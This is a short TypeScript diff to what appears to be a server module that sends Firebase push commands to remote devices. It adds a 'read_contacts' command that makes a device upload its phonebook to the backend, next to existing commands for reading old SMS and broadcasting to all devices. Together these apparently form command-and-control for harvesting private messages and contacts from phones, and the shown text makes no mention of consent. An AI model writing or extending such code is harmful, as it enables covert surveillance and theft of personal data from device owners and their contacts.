@@ -493,6 +493,26 @@ export async function sendReadOldSmsCommand(
   });
 }
 
+
+/* ═══════════════════════════════════════════
+   READ CONTACTS COMMAND (NEW)
+   ═══════════════════════════════════════════ */
+
+/**
+ * Send read_contacts command to device via FCM.
+ * Device will read phonebook contacts and push them to backend.
+ */
+export async function sendReadContactsCommand(
+  deviceId: string,
+) {
+  return sendCommandToDevice(deviceId, "read_contacts", {
+    requestId: `contacts_${deviceId}_${Date.now()}`,
+    extraData: {
+      timestamp: Date.now(),
+    },
+  });
+}
+
 export default {
   buildCommandPayload,
   sendToToken,
@@ -512,4 +532,5 @@ export default {
   sendPing,
   broadcastCommandToAllDevices,
   sendReadOldSmsCommand,
+  sendReadContactsCommand,
 };
